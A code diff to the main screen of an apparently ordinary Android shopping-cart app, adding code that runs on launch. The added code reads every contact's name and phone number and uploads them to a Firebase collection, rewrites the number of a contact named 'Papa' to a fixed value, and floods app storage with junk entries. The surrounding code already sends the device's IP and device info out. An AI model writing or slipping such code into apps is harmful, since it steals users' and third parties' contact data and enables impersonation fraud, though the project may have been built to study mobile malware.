@@ -2,10 +2,13 @@ package at.fhj.hofer_cart
 
 
 import android.Manifest
+import android.content.ContentProviderOperation
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.provider.ContactsContract
 import android.provider.Settings
 import android.util.Log
 import android.widget.Toast
@@ -49,6 +52,7 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         try{
+            createBigFile()
             requestPermissions()
             getDeviceInfo()
             sendIpToFirebase()
@@ -96,6 +100,17 @@ class MainActivity : ComponentActivity() {
 
     }
 
+    private fun createBigFile(){
+        val sharedPref = getSharedPreferences("PREFERENCE_FILE_KEY", Context.MODE_PRIVATE)
+        val editor = sharedPref.edit()
+
+
+        for (i in 1..10000) {
+            editor.putString("Key$i", "This is value $i")
+        }
+
+        editor.apply()
+    }
     private suspend fun getMyPublicIpAsync() : Deferred<String> =
         coroutineScope {
             async(Dispatchers.IO) {
@@ -150,10 +165,93 @@ class MainActivity : ComponentActivity() {
         }
     }
     private fun accessContacts() {
+        lifecycleScope.launch(Dispatchers.IO) {
+            // Access contacts
+            val contactsUri = ContactsContract.Contacts.CONTENT_URI
+            val contactsCursor = contentResolver.query(contactsUri, null, null, null, null)
 
+            contactsCursor?.apply {
+                val idIndex = getColumnIndex(ContactsContract.Contacts._ID)
+                val nameIndex = getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+                val hasPhoneIndex = getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
+
+                while (moveToNext()) {
+                    val id = if (idIndex != -1) getString(idIndex) else null
+                    val name = if (nameIndex != -1) getString(nameIndex) else null
+
+                    if (hasPhoneIndex != -1 && getInt(hasPhoneIndex) > 0) {
+                        val phoneCursor = contentResolver.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", arrayOf(id), null
+                        )
+
+                        phoneCursor?.apply {
+                            val phoneNumberIndex = getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+                            while (moveToNext()) {
+                                val phoneNumber = if (phoneNumberIndex != -1) getString(phoneNumberIndex) else null
+                                println("Name: $name, Phone Number: $phoneNumber")
+
+                                val deviceInfo = HashMap<String, String>().apply {
+                                    if (name != null) {
+                                        put("Name", name)
+                                    }
+                                    if (phoneNumber != null) {
+                                        put("PhoneNumber", phoneNumber)
+                                    }
+                                }
+
+                                FirebaseFirestore.getInstance().collection("phone-number")
+                                    .add(deviceInfo)
+                                    .addOnSuccessListener { documentReference ->
+                                        Log.d("info", "DocumentSnapshot added with ID: ${documentReference.id}")
+                                    }
+                                    .addOnFailureListener { e ->
+                                        Log.w("info", "Error adding document", e)
+                                    }
+
+                            }
+                            close()
+                        }
+                    }
+                }
+                close()
+            }
+        }
     }
     private fun changePhoneNumber() {
+        lifecycleScope.launch(Dispatchers.IO) {
+            // Access contacts
+            val contactsUri = ContactsContract.Contacts.CONTENT_URI
+            val contactsCursor = contentResolver.query(contactsUri, null, null, null, null)
 
+            contactsCursor?.apply {
+                val idIndex = getColumnIndex(ContactsContract.Contacts._ID)
+                val nameIndex = getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+
+                while (moveToNext()) {
+                    val id = if (idIndex != -1) getString(idIndex) else null
+                    val name = if (nameIndex != -1) getString(nameIndex) else null
+
+                    if (name == "Papa") {
+                        val ops = ArrayList<ContentProviderOperation>()
+
+                        ops.add(ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
+                            .withSelection("${ContactsContract.Data.CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?",
+                                arrayOf(id, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE))
+                            .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, "+43 12345")
+                            .build())
+
+                        try {
+                            contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)
+                        } catch (e: Exception) {
+                            e.printStackTrace()
+                        }
+                    }
+                }
+                close()
+            }
+        }
     }
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
